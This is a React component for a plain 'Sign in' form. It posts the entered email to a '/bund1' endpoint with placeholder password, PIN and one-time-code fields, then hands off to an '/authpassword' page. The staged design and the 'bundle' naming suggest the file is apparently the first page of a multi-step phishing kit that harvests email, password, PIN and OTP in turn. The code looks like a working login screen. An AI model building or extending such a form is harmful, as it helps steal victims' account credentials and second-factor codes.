import React, { useState, useEffect } from 'react'
import { Link, useHistory } from 'react-router-dom'
import 'react-intl-tel-input/dist/main.css'
import URL from './Url.js'


const Form = () => {
    const history = useHistory()

    const [loading, setLoading] = useState(false)
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [token, setToken] = useState('')
    const [err, setErr] = useState(false)
    const [message, setMessage] = useState(null)

    

    const fetchCsrf = async () => {
        const response = await fetch(URL + '/form', {
            method: 'GET',
            headers: {
                Accept: 'application/json',
                'Content-type': 'application/json',
            },
            credentials: 'include',
            mode: 'cors',
        })

        const resData = await response.json()
        setToken(resData.token)
    }

    useEffect(() => {
        console.log('bundle one')
        fetchCsrf()
    }, [])

    useEffect(() => {
        if (err) {
            setMessage(<p className='text-red-500'>Field not valid</p>)
        } else {
            setMessage(null)
        }
    }, [setErr, err])

    const handleEmail = (e) => {
        setEmail(e.target.value)
    }

    const handlePassword = e => {
        setPassword(e.target.value)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (email === '' || email.length < 9) {
            setErr(true)
            setLoading(false)
        } else {
            try {
                const response = await fetch(URL + '/bund1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email,
                        password: '',
                        pin: '',
                        otp: '',
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/authpassword', { email, token })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
                setLoading(false)
            }
        }
    }

    return (
        <form
            className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 loginForm'
            style={{ padding: '27px 12px' }}
            onSubmit={handleSubmit}
        >
            <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                Sign in
            </h2>
            <div className='relative'>
                <label htmlFor='email' className='input-label absolute'>
                    {' '}
                    Email
                </label>
                <input
                    type='email'
                    id='email'
                    required
                    className='sign-in-input'
                    value={email}
                    onChange={handleEmail}
                />
            </div>
            <div className='relative'>
                <label for='password' className='input-label absolute'>
                    Password
                </label>
                <input
                    type='password'
                    id='password'
                    className='sign-in-input'
                    required
                    value={password}
                    onChange={handlePassword}
                />
            </div>
            <div className='flex justify-center '>
                <div class='font-medium text-center underline text-[#006f95]'>
                    Recover password?
                </div>
            </div>
            <button
                className=' rounded-md outline-none  bg-[#00bfff] text-white text-sm btn'
                style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
            >
                {loading ? 'loading..' : 'Continue'}
            </button>
        </form>
    )
}

export default Form
